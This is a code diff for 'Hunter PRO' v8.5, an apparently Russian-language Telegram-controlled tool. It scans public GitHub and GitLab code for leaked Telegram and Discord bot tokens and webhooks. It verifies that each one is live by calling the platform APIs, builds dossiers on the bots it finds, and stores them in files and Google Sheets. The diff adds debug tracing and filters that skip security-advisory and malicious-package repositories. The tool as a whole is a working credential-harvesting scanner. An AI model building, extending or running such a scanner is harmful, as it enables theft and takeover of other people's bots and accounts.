@@ -51,7 +51,7 @@ SEEN_DB_FILE = os.getenv("SEEN_DB_FILE", "seen_tokens.txt")
 LIVE_DB_FILE = os.getenv("LIVE_DB_FILE", "live_tokens.json")
 
 MAX_LOG_LINES = 15
-TARGET_TIMEOUT = (2.0, 3.0)
+TARGET_TIMEOUT = (2.0, 3.5)
 
 if not CONTROL_BOT_TOKEN:
     raise RuntimeError("Не задана переменная окружения CONTROL_BOT_TOKEN!")
@@ -61,13 +61,13 @@ app = Flask(__name__)
 
 search_session = requests.Session()
 search_session.headers.update({
-    "User-Agent": "HunterPRO-Scanner/8.4 (+https://github.com)",
+    "User-Agent": "HunterPRO-Scanner/8.5 (+https://github.com)",
     "Accept": "application/json",
 })
 
 
 # =====================================================================
-# 2. ВРЕМЯ ПО КИЕВУ И БАЗОВЫЕ УТИЛИТЫ
+# 2. ВРЕМЯ ПО КИЕВУ И СУПЕР-ОТЛАДКА ([TRACE])
 # =====================================================================
 def now_kyiv() -> datetime:
     if KYIV_TZ is not None:
@@ -88,8 +88,24 @@ def format_time(seconds: Optional[float]) -> str:
     return f"{hours:02d}:{minutes:02d}:{sec:02d}"
 
 
-def dbg(msg: str) -> None:
-    print(f"[{kyiv_time_str('%H:%M:%S')}] [DBG] {msg}", flush=True)
+def trace(msg: str) -> None:
+    th_name = threading.current_thread().name
+    print(f"[{kyiv_time_str('%H:%M:%S.%f')[:-3]}] [TRACE:{th_name}] {msg}", flush=True)
+
+
+def _install_thread_excepthook() -> None:
+    def _hook(args):
+        print(
+            f"[{kyiv_time_str('%H:%M:%S')}] [THREAD_CRASH] {args.thread.name}: {args.exc_type.__name__}: {args.exc_value}",
+            flush=True,
+        )
+        traceback.print_exception(args.exc_type, args.exc_value, args.exc_traceback)
+
+    if hasattr(threading, "excepthook"):
+        threading.excepthook = _hook
+
+
+_install_thread_excepthook()
 
 
 # =====================================================================
@@ -136,7 +152,17 @@ CONFIG_DORKS = [
     "discord.com/api/webhooks",
 ]
 
-NOISE_FILTERS = "NOT example NOT sample NOT YOUR_TOKEN NOT token_here NOT placeholder"
+NOISE_FILTERS = (
+    "NOT example NOT sample NOT YOUR_TOKEN NOT token_here NOT placeholder "
+    "NOT malicious NOT test NOT dummy"
+)
+
+SKIP_REPOS_SUBSTRINGS = (
+    "ossf/malicious-packages",
+    "malicious-packages",
+    "advisories",
+    "cve-",
+)
 
 TARGET_FILENAMES = [
     "",
@@ -312,7 +338,7 @@ def notify_critical_error(alert_key: str, title: str, details: str) -> None:
             disable_web_page_preview=True,
         )
     except Exception as send_err:
-        print(f"[ALERT] Не удалось отправить алерт админу: {send_err}", flush=True)
+        trace(f"Не удалось отправить алерт админу: {send_err}")
 
 
 def reset_critical_alert(alert_key: str) -> None:
@@ -526,7 +552,7 @@ def save_live_token(token_data: Dict[str, Any]) -> bool:
 
 
 # =====================================================================
-# 7. ПРОВЕРКА ТОКЕНОВ И ВЕБХУКОВ (ПРЯМОЙ ВЫЗОВ + ПОШАГОВЫЙ ЛОГ)
+# 7. ПРОВЕРКА ТОКЕНОВ И ВЕБХУКОВ (ПРЯМОЙ ВЫЗОВ + ПОШАГОВЫЙ TRACE)
 # =====================================================================
 def _direct_get_json(
     full_url: str,
@@ -534,13 +560,14 @@ def _direct_get_json(
     timeout: Tuple[float, float] = TARGET_TIMEOUT,
 ) -> Tuple[int, Optional[Dict[str, Any]], Optional[str]]:
     req_headers = {
-        "User-Agent": "HunterPRO-Verifier/8.4",
+        "User-Agent": "HunterPRO-Verifier/8.5",
         "Accept": "application/json",
         "Connection": "close",
     }
     if headers:
         req_headers.update(headers)
 
+    t0 = time.time()
     try:
         resp = requests.get(
             full_url,
@@ -551,6 +578,8 @@ def _direct_get_json(
         status = resp.status_code
         raw_text = resp.content[:65536].decode("utf-8", errors="ignore")
         resp.close()
+        dt = time.time() - t0
+        trace(f"HTTP {status} за {dt:.2f}с -> {full_url[:70]}")
 
         if status != 200:
             return status, None, f"HTTP {status}"
@@ -564,26 +593,33 @@ def _direct_get_json(
             return 200, None, "bad json"
 
     except requests.Timeout:
+        dt = time.time() - t0
+        trace(f"TIMEOUT за {dt:.2f}с -> {full_url[:70]}")
         return 0, None, "таймаут"
     except requests.ConnectionError as c_exc:
-        short_c = str(c_exc).splitlines()[0][:24] if str(c_exc) else "сеть"
+        dt = time.time() - t0
+        short_c = str(c_exc).splitlines()[0][:28] if str(c_exc) else "сеть"
+        trace(f"CONN_ERR за {dt:.2f}с ({short_c}) -> {full_url[:70]}")
         return 0, None, f"сеть:{short_c}"
     except requests.RequestException as r_exc:
-        short_r = str(r_exc).splitlines()[0][:24] if str(r_exc) else "req_err"
+        dt = time.time() - t0
+        short_r = str(r_exc).splitlines()[0][:28] if str(r_exc) else "req_err"
+        trace(f"REQ_ERR за {dt:.2f}с ({short_r}) -> {full_url[:70]}")
         return 0, None, f"req:{short_r}"
     except Exception as exc:
+        dt = time.time() - t0
+        trace(f"ERR за {dt:.2f}с ({exc}) -> {full_url[:70]}")
         return 0, None, f"err:{str(exc)[:20]}"
 
 
 def check_telegram_token(token: str) -> Tuple[bool, Optional[str], bool, str, Optional[str]]:
-    dbg("1/4: запрос getMe...")
+    trace("TG 1/4: getMe")
     t0 = time.time()
     code, payload, err = _direct_get_json(
         f"https://api.telegram.org/bot{token}/getMe",
         timeout=TARGET_TIMEOUT,
     )
     dt = time.time() - t0
-    dbg(f"1/4 ответ getMe: code={code}, err={err}, dt={dt:.2f}с")
 
     if code == 429:
         return False, None, False, "", f"rate limit 429 ({dt:.1f}с)"
@@ -608,20 +644,20 @@ def check_telegram_token(token: str) -> Tuple[bool, Optional[str], bool, str, Op
     cmds_text = "Нет команд"
     wh_text = "Webhook не задан"
 
-    dbg("2/4: запрос getMyDescription...")
+    trace("TG 2/4: getMyDescription")
     _, d_data, _ = _direct_get_json(
         f"https://api.telegram.org/bot{token}/getMyDescription",
-        timeout=(1.5, 2.0),
+        timeout=(1.5, 2.5),
     )
     if isinstance(d_data, dict) and isinstance(d_data.get("result"), dict):
         raw_desc = d_data["result"].get("description")
         if raw_desc:
             desc_text = html.escape(str(raw_desc).strip()[:200])
 
-    dbg("3/4: запрос getMyCommands...")
+    trace("TG 3/4: getMyCommands")
     _, c_data, _ = _direct_get_json(
         f"https://api.telegram.org/bot{token}/getMyCommands",
-        timeout=(1.5, 2.0),
+        timeout=(1.5, 2.5),
     )
     if isinstance(c_data, dict) and isinstance(c_data.get("result"), list):
         parsed = [
@@ -632,10 +668,10 @@ def check_telegram_token(token: str) -> Tuple[bool, Optional[str], bool, str, Op
         if parsed:
             cmds_text = ", ".join(parsed)
 
-    dbg("4/4: запрос getWebhookInfo...")
+    trace("TG 4/4: getWebhookInfo")
     _, wh_data, _ = _direct_get_json(
         f"https://api.telegram.org/bot{token}/getWebhookInfo",
-        timeout=(1.5, 2.0),
+        timeout=(1.5, 2.5),
     )
     if isinstance(wh_data, dict) and isinstance(wh_data.get("result"), dict):
         wh_res = wh_data["result"]
@@ -658,7 +694,7 @@ def check_telegram_token(token: str) -> Tuple[bool, Optional[str], bool, str, Op
 
 
 def check_discord_token(token: str) -> Tuple[bool, Optional[str], bool, str, Optional[str]]:
-    dbg("Discord bot check...")
+    trace("DC bot check")
     t0 = time.time()
     code, data, err = _direct_get_json(
         "https://discord.com/api/v10/users/@me",
@@ -666,7 +702,6 @@ def check_discord_token(token: str) -> Tuple[bool, Optional[str], bool, str, Opt
         timeout=TARGET_TIMEOUT,
     )
     dt = time.time() - t0
-    dbg(f"Discord bot ответ: code={code}, err={err}, dt={dt:.2f}с")
     if code == 200 and isinstance(data, dict):
         username = data.get("username") or "DiscordBot"
         discriminator = data.get("discriminator")
@@ -681,14 +716,13 @@ def check_discord_token(token: str) -> Tuple[bool, Optional[str], bool, str, Opt
 
 
 def check_discord_webhook(webhook_url: str) -> Tuple[bool, Optional[str], bool, str, Optional[str]]:
-    dbg("Discord webhook check...")
+    trace("DC webhook check")
     t0 = time.time()
     code, data, err = _direct_get_json(
         webhook_url,
         timeout=TARGET_TIMEOUT,
     )
     dt = time.time() - t0
-    dbg(f"Discord webhook ответ: code={code}, err={err}, dt={dt:.2f}с")
     if code == 200 and isinstance(data, dict):
         name = data.get("name") or "Webhook"
         ch_id = data.get("channel_id")
@@ -799,6 +833,11 @@ def _allowed_by_hunt_mode(platform: str, hunt_mode: str) -> bool:
     return True
 
 
+def _is_noisy_repo(repo_full_name: str) -> bool:
+    low = (repo_full_name or "").lower()
+    return any(bad in low for bad in SKIP_REPOS_SUBSTRINGS)
+
+
 def extract_findings_from_text(
     text: str,
     repo_full_name: str,
@@ -883,6 +922,7 @@ def search_github_dynamic() -> Tuple[List[Dict[str, str]], int]:
 
     query = _build_search_query(hunt_mode)
     set_status(cur_status, f"GitHub [{HUNT_MODES.get(hunt_mode, hunt_mode)}]: {query}")
+    trace(f"GitHub запрос: {query}")
 
     headers = {
         "Accept": "application/vnd.github.text-match+json",
@@ -897,6 +937,7 @@ def search_github_dynamic() -> Tuple[List[Dict[str, str]], int]:
         "order": "desc",
     }
 
+    t0 = time.time()
     try:
         resp = search_session.get(
             "https://api.github.com/search/code",
@@ -904,6 +945,8 @@ def search_github_dynamic() -> Tuple[List[Dict[str, str]], int]:
             params=params,
             timeout=(2.5, 6.0),
         )
+        dt = time.time() - t0
+        trace(f"GitHub ответил {resp.status_code} за {dt:.2f}с (remaining={resp.headers.get('X-RateLimit-Remaining')})")
 
         if resp.status_code == 401:
             set_status("❌ Ошибка авторизации GitHub Token!")
@@ -931,11 +974,17 @@ def search_github_dynamic() -> Tuple[List[Dict[str, str]], int]:
         reset_critical_alert("github_401")
         payload = resp.json()
         items = payload.get("items") or [] if isinstance(payload, dict) else []
+        trace(f"GitHub items count: {len(items)}")
 
+        skipped_repos = 0
         for item in items:
             if not isinstance(item, dict):
                 continue
             repo_name = (item.get("repository") or {}).get("full_name") or "unknown/repo"
+            if _is_noisy_repo(repo_name):
+                skipped_repos += 1
+                continue
+
             html_url = item.get("html_url") or "https://github.com"
             fragments = []
             for m in item.get("text_matches") or []:
@@ -953,8 +1002,8 @@ def search_github_dynamic() -> Tuple[List[Dict[str, str]], int]:
                 seen_tokens.add(item_found["token"])
                 findings.append(item_found)
 
-        add_log(f"📦 GitHub нашёл кандидатов: {len(findings)}")
-        _sleep_respecting_stop(3.0)
+        add_log(f"📦 GitHub нашёл кандидатов: {len(findings)} (пропущено шумных репо: {skipped_repos})")
+        _sleep_respecting_stop(2.0)
         return findings, 200
 
     except requests.RequestException as exc:
@@ -986,6 +1035,7 @@ def search_gitlab() -> List[Dict[str, str]]:
     findings: List[Dict[str, str]] = []
     seen_tokens = load_seen_tokens()
     set_status(cur_status, f"GitLab: {query}")
+    trace(f"GitLab запрос: {query}")
 
     headers = {"PRIVATE-TOKEN": GITLAB_TOKEN}
     params = {"scope": "blobs", "search": query, "per_page": 8}
@@ -1431,8 +1481,8 @@ def send_welcome(message: types.Message):
     cur_hunt = HUNT_MODES.get(snap["hunt_mode"], snap["hunt_mode"])
 
     welcome_text = (
-        "👋 <b>Пульт Hunter PRO v8.4</b>\n"
-        "Сканер токенов и вебхуков с ручной проверкой, досье (вкл. webhook), режимами охоты, фильтрами и экспортом.\n\n"
+        "👋 <b>Пульт Hunter PRO v8.5</b>\n"
+        "Сканер токенов и вебхуков с супер-отладкой, ручной проверкой, досье (вкл. webhook), режимами охоты, фильтрами и экспортом.\n\n"
         f"☁️ Google Sheets: <code>{html.escape(sheets_status)}</code>\n"
         f"🎯 Охота: <code>{html.escape(cur_hunt)}</code>\n"
         f"🎛 Фильтр сессии: <code>{html.escape(cur_filter)}</code>\n"
@@ -1699,7 +1749,7 @@ def _run_manual_check_and_reply(chat_id: int, target_str: str) -> None:
                     disable_web_page_preview=True,
                 )
 
-    threading.Thread(target=_worker, daemon=True).start()
+    threading.Thread(target=_worker, name="ManualCheck", daemon=True).start()
 
 
 @bot.callback_query_handler(func=lambda call: call.data == "save_manual_last")
@@ -2097,9 +2147,10 @@ def start_search_command(message: types.Message):
         })
 
     add_log("🚀 Старт поисковой сессии")
+    trace(f"Запуск поиска в chat_id={message.chat.id}")
 
     if SPREADSHEET_ID and (GOOGLE_CREDS_B64 or GOOGLE_CREDS_JSON_RAW):
-        threading.Thread(target=get_google_worksheet, daemon=True).start()
+        threading.Thread(target=get_google_worksheet, name="SheetsInit", daemon=True).start()
 
     msg = bot.send_message(
         message.chat.id,
@@ -2109,17 +2160,20 @@ def start_search_command(message: types.Message):
     threading.Thread(
         target=live_ui_updater,
         args=(message.chat.id, msg.message_id),
+        name="LiveUI",
         daemon=True,
     ).start()
     threading.Thread(
         target=run_search_task,
         args=(message.chat.id, msg.message_id),
+        name="SearchLoop",
         daemon=True,
     ).start()
 
 
 def live_ui_updater(chat_id: int, msg_id: int) -> None:
     spinner_idx = 0
+    first_tick = True
     while True:
         with state_lock:
             active = search_state["is_searching"] and not search_state["stop_requested"]
@@ -2130,7 +2184,11 @@ def live_ui_updater(chat_id: int, msg_id: int) -> None:
 
         update_progress_message(chat_id, msg_id, spinner_idx)
         spinner_idx += 1
-        _sleep_respecting_stop(6)
+        if first_tick:
+            first_tick = False
+            _sleep_respecting_stop(1.5)
+        else:
+            _sleep_respecting_stop(4.0)
 
 
 def update_progress_message(chat_id: int, msg_id: int, spinner_idx: int = 0) -> None:
@@ -2169,8 +2227,8 @@ def update_progress_message(chat_id: int, msg_id: int, spinner_idx: int = 0) -> 
             parse_mode="HTML",
             reply_markup=get_progress_buttons(),
         )
-    except Exception:
-        pass
+    except Exception as e:
+        trace(f"edit_message_text skip: {str(e)[:40]}")
 
 
 def _matches_session_filter(f_type: str, is_scam: bool, filter_mode: str) -> bool:
@@ -2184,6 +2242,7 @@ def _matches_session_filter(f_type: str, is_scam: bool, filter_mode: str) -> boo
 def process_single_finding(finding: Dict[str, str], chat_id: int) -> None:
     with state_lock:
         if search_state["stop_requested"] or search_state["found_live_current"] >= search_state["limit_live"]:
+            trace("process_single_finding прерван: stop или лимит")
             return
 
     f_type = finding.get("type", "")
@@ -2205,7 +2264,7 @@ def process_single_finding(finding: Dict[str, str], chat_id: int) -> None:
         traceback.print_exc()
         err_reason = f"сбой:{str(exc)[:18]}"
 
-    dbg(f"результат проверки: is_live={is_live}, bot={bot_name}, err={err_reason}")
+    trace(f"Итог проверки {f_type}: live={is_live}, name={bot_name}, err={err_reason}")
 
     with state_lock:
         search_state["checked_tokens"] += 1
@@ -2303,19 +2362,26 @@ def _build_final_summary(snap: Dict[str, Any]) -> str:
 
 
 def run_search_task(chat_id: int, msg_id: int) -> None:
+    cycle_num = 0
+    trace("SearchLoop запущен")
     try:
         while True:
+            cycle_num += 1
+            trace(f"=== Начало цикла #{cycle_num} ===")
             try:
                 with state_lock:
                     if search_state["stop_requested"]:
                         search_state["status_text"] = "Остановлено пользователем"
+                        trace("Выход: stop_requested=True")
                         break
                     if search_state["found_live_current"] >= search_state["limit_live"]:
                         search_state["status_text"] = "Лимит находок достигнут"
+                        trace("Выход: достигнут limit_live")
                         break
-                    search_state["status_text"] = "Поиск в репозиториях..."
+                    search_state["status_text"] = f"Поиск в репозиториях (цикл #{cycle_num})..."
 
                 raw_findings, code = search_github_dynamic()
+                trace(f"Цикл #{cycle_num}: GitHub code={code}, кандидатов={len(raw_findings)}")
                 if code == 401:
                     break
 
@@ -2326,9 +2392,12 @@ def run_search_task(chat_id: int, msg_id: int) -> None:
                     )
 
                 if still_active and random.random() < 0.35:
-                    raw_findings.extend(search_gitlab())
+                    gl_items = search_gitlab()
+                    trace(f"Цикл #{cycle_num}: GitLab кандидатов={len(gl_items)}")
+                    raw_findings.extend(gl_items)
 
                 if not raw_findings:
+                    trace(f"Цикл #{cycle_num}: кандидатов 0, переходим к следующему циклу")
                     continue
 
                 total_cands = len(raw_findings)
@@ -2339,17 +2408,22 @@ def run_search_task(chat_id: int, msg_id: int) -> None:
                             search_state["stop_requested"]
                             or search_state["found_live_current"] >= search_state["limit_live"]
                         ):
+                            trace("Прерывание перебора кандидатов по stop/limit")
                             break
                     set_status(f"Проверка {idx}/{total_cands}...")
+                    trace(f"Цикл #{cycle_num}: кандидат {idx}/{total_cands} ({item.get('type')})")
                     process_single_finding(item, chat_id)
                     update_progress_message(chat_id, msg_id)
 
+                trace(f"=== Конец цикла #{cycle_num} ===")
+
             except Exception as loop_exc:
                 traceback.print_exc()
-                add_log(f"⚠️ Сбой итерации цикла: {str(loop_exc)[:35]}")
+                add_log(f"⚠️ Сбой итерации цикла #{cycle_num}: {str(loop_exc)[:35]}")
                 _sleep_respecting_stop(3)
 
     finally:
+        trace("SearchLoop завершает работу, формирую сводный отчёт")
         with state_lock:
             search_state["is_searching"] = False
             if search_state["start_time"] is None:
@@ -2366,11 +2440,12 @@ def run_search_task(chat_id: int, msg_id: int) -> None:
                 parse_mode="HTML",
                 reply_markup=None,
             )
-        except Exception:
+        except Exception as e:
+            trace(f"Ошибка edit сводного отчёта: {e}")
             try:
                 bot.send_message(chat_id, summary_text, parse_mode="HTML")
-            except Exception:
-                pass
+            except Exception as e2:
+                trace(f"Ошибка send сводного отчёта: {e2}")
 
 
 # =====================================================================
@@ -2414,10 +2489,12 @@ def run_bot_polling() -> None:
 
 
 if __name__ == "__main__":
+    trace("Старт приложения Hunter PRO v8.5")
     if SPREADSHEET_ID and (GOOGLE_CREDS_B64 or GOOGLE_CREDS_JSON_RAW):
-        threading.Thread(target=get_google_worksheet, daemon=True).start()
+        threading.Thread(target=get_google_worksheet, name="SheetsStartup", daemon=True).start()
 
-    threading.Thread(target=run_bot_polling, daemon=True).start()
+    threading.Thread(target=run_bot_polling, name="BotPolling", daemon=True).start()
 
     port = int(os.environ.get("PORT", "10000"))
+    trace(f"Запуск Flask на порту {port}")
     app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
